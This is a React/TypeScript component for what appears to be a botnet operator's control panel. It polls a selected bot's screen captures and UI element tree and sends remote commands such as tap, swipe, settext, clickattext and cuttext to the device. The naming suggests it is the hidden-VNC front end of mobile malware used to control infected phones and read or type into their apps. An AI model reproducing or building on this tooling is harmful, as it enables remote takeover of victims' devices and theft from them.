import React, {useLayoutEffect, useState} from "react";
import {Button, Divider} from "antd";
import $ from "jquery";
import "./inspector.css";
import {useQuery} from "../../../Hook/useQuery";
import {NavLink} from "react-router-dom";
import {INode} from "../../../Interfaces/Inspector/INode";
import {InspectorService} from "../../../Service/Inspector/Inspector";
import VncControls from "./VNCControls";
import {VNCEvent} from "../../../Interfaces/VNC/VNCEvent";
import {errorNotify} from "../../../Util/config";
import sendCommand from "../../../Requests/Commands/sendCommands";
import BotCommands from "../../Misc/BotCommands";
import {getBotCommandsList} from "../../../Store/BotCommands/Actions";
import {useTranslation} from "react-i18next";
import useBreakpoint from "antd/es/grid/hooks/useBreakpoint";
import VNCControlsMobile from "./VNCControlsMobile";
import {getBotVNCData} from "../../../Store/BotVNC/Actions";
import {AppState} from "../../../Store/RootReducer";
import useInterval from "../../../Hook/useInterval";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";
import {ITree} from "../../../Interfaces/Inspector/ITree";

const Vnc: React.FC = () => {
    const query = useQuery();
    const {t} = useTranslation();

    const [currentControl, setCurrentControl] = useState<VNCEvent>("tap");

    const selectedBotId = query.get("bot_id") as string;

    const botVNCReducer = useAppSelector((state: AppState) => state.botVNC);

    const dispatch = useAppDispatch();

    const tree: ITree = {...botVNCReducer.tree as ITree};

    const sendVNCCommand = (event: VNCEvent, payload: Record<string, any>): void => {
        sendCommand({
            botIds: [selectedBotId],
            payload: payload,
            command: event,
        });

        setTimeout(() => dispatch(getBotCommandsList(selectedBotId)), 1000);
    };

    const [sendText, setSendText] = useState<string>("");

    const onClickNodeCallback = (node: INode) => {
        switch (currentControl) {
        case "clickatcontaintext":
        case "clickattext":
        case "cuttext":
            if (node.text) {
                sendVNCCommand(currentControl, {
                    text: node.text,
                });
            } else {
                errorNotify("VNC", "NODE NO HAS TEXT");
            }
            break;
        case "swipe":
            sendVNCCommand(currentControl, {
                x: node.bounds.centerX.toString(),
                y: node.bounds.centerY.toString(),
                x1: (node.bounds.centerX + 500).toString(),
                y1: (node.bounds.centerY + 500).toString(),
            });
            break;
        case "settext":
            sendVNCCommand(currentControl, {
                text: sendText,
                viewid: node.id,
            });
            setCurrentControl("tap");
            break;
        case "clickat":
            if (node.id) {
                sendVNCCommand(currentControl, {
                    id: node.id,
                });
            } else {
                errorNotify("VNC", "NODE NO HAS ID");
            }
        }
    };

    const onClickCoordinatesCallback = (x: number, y: number) => {
        switch (currentControl) {
        case "longpress":
        case "scrollup":
        case "scrolldown":
        case "scrollup_":
        case "scrolldown_":
        case "swipeup":
        case "swiperight":
        case "swipeleft":
        case "swipedown":
        case "tap":
            sendVNCCommand(currentControl, {
                x: x.toString(),
                y: y.toString(),
            });
            break;
        default:
            break;
        }
    };

    const [inspectorInstance] = useState(new InspectorService(onClickNodeCallback, onClickCoordinatesCallback));

    const [textModeIsEnabled, setTextModeIsEnabled] = useState<boolean>(false);

    const [disableScreenView, setDisableScreenView] = useState<boolean>(false);

    useLayoutEffect(() => {
        if (selectedBotId) {
            dispatch(getBotCommandsList(selectedBotId));
            dispatch(getBotVNCData(selectedBotId));
        }
    }, [selectedBotId, getBotVNCData, getBotCommandsList, dispatch]);

    useInterval(() => {
        if (selectedBotId) {
            dispatch(getBotVNCData(selectedBotId));
        }
    }, 600);

    useLayoutEffect(() => {
        inspectorInstance.setTree(tree);
        inspectorInstance.setOnClickNodeCallback(onClickNodeCallback);
        inspectorInstance.setOnClickCoordinatesCallback(onClickCoordinatesCallback);
        inspectorInstance.setType([
            "longpress",
            "scrollup",
            "scrolldown",
            "scrollup_",
            "scrolldown_",
            "swipeup",
            "swiperight",
            "swipeleft",
            "swipedown",
            "tap",
        ].includes(currentControl) ? "coordinates" : "node");

        inspectorInstance.setTextModeIsEnabled(textModeIsEnabled);

        if (botVNCReducer.updatedAt !== botVNCReducer.prevUpdatedAt && botVNCReducer.isActive) {
            $(function() {
                inspectorInstance.render();
            });
        }
    }, [botVNCReducer.tree, botVNCReducer.prevUpdatedAt, botVNCReducer.updatedAt, onClickNodeCallback, currentControl, textModeIsEnabled]);

    const screens = useBreakpoint();

    return (
        <>
            {!screens.xs && (
                <div className="panel-header">
                    <h2 className="panel-title">
                        {t("VNC")}
                    </h2>
                </div>
            )}

            <div className="panel-content">
                {!screens.xs && (
                    <>
                        <div>
                            <span>
                                {selectedBotId ?
                                    selectedBotId :
                                    <>
                                        {t("VNC_SELECT_BOT_HERE")} <NavLink to="/">{t("HERE")}</NavLink>. {t("VNC_CLICK_HERE")}&nbsp;
                                        <Button
                                            icon={(
                                                <span className="anticon">
                                                    <i className="icon-vnc"/>
                                                </span>
                                            )}
                                            type="dashed"
                                        />
                                    </>
                                }
                            </span>
                        </div>

                        <Divider/>
                    </>
                )}

                <div className="vnc-container">
                    {screens.xs ? (
                        <VNCControlsMobile
                            currentControl={currentControl}
                            setCurrentControl={setCurrentControl}
                            sendVNCCommand={sendVNCCommand}
                            selectedBotId={selectedBotId}
                            textModeIsEnabled={textModeIsEnabled}
                            setTextModeIsEnabled={setTextModeIsEnabled}
                            disableScreenView={disableScreenView}
                            setDisableScreenView={setDisableScreenView}
                            setSendText={setSendText}
                        />
                    ) : (
                        <VncControls
                            currentControl={currentControl}
                            setCurrentControl={setCurrentControl}
                            sendVNCCommand={sendVNCCommand}
                            selectedBotId={selectedBotId}
                            textModeIsEnabled={textModeIsEnabled}
                            setTextModeIsEnabled={setTextModeIsEnabled}
                            disableScreenView={disableScreenView}
                            setDisableScreenView={setDisableScreenView}
                            setSendText={setSendText}
                        />
                    )}

                    <div className="vnc-view">
                        {!screens.xs && (
                            <div className="vnc-controls-head">
                                <h3>
                                    {t("VNC_VIEWPORT")}
                                </h3>
                            </div>
                        )}

                        <div className="vnc-panel-flex">
                            <div id="panel1">
                                {query.get("bot_id") && botVNCReducer.isLoaded && botVNCReducer.screen ? (
                                    <div id="screen">
                                        <img
                                            alt={"screen"}
                                            src={"data:image/png;base64," + botVNCReducer.screen}
                                            style={{
                                                height: screens.xs ? "calc(100vh - 230px)" : "63vh",
                                                opacity: disableScreenView ? 0 : 1,
                                            }}
                                        />
                                    </div>
                                ) : (
                                    <div
                                        className="vnc-screen-placeholder"
                                        style={{
                                            width: 280,
                                            height: "59vh",
                                        }}
                                    >
                                        <div>
                                            <i className="fa-solid fa-info-circle" />
                                        </div>
                                        <span>
                                            {t("SELECT_BOT_AND_START_VNC")}
                                        </span>
                                    </div>
                                )}
                            </div>
                            <div id="panel21" className="vnc-info-flex">
                                {screens.sm && selectedBotId && (
                                    <div className="vnc-info-item">
                                        <BotCommands botId={selectedBotId} load={true}/>
                                    </div>
                                )}
                                <div className="vnc-info-item" style={{display: screens.xs ? "none" : "block"}}>
                                    <Divider orientation="left" style={{marginBottom: 0}}>
                                        {t("VNC_TREE")}
                                    </Divider>

                                    <div id="tree" />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default Vnc;
